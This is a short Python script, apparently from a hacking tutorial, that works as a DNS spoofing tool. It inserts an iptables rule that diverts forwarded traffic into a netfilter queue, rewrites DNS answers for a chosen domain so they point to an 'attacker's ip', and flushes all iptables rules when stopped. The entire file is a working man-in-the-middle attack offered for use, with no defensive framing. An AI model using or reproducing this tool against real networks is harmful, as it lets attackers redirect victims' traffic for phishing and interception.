#!/usr/bin/env python3

import subprocess
import netfilterqueue
import scapy.all as scapy
import optparse


def get_parameters():
    parser = optparse.OptionParser()
    parser.add_option('-d', '--domain', dest='domain', help='domain to spoof')
    parser.add_option('--ip', dest='ip', help='attacker\'s ip')
    (options, arguments) = parser.parse_args()
    if not options.domain:
        parser.error('[-] domain is required. use --help for more information')
    elif not options.ip:
        parser.error(
            '[-] attacker\'s ip is required. use --help for more information')
    return options


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        global options
        if qname == options.domain:
            print("[+] spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata=options.ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(str(scapy_packet))
    packet.accept()


options = get_parameters()
try:
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True)
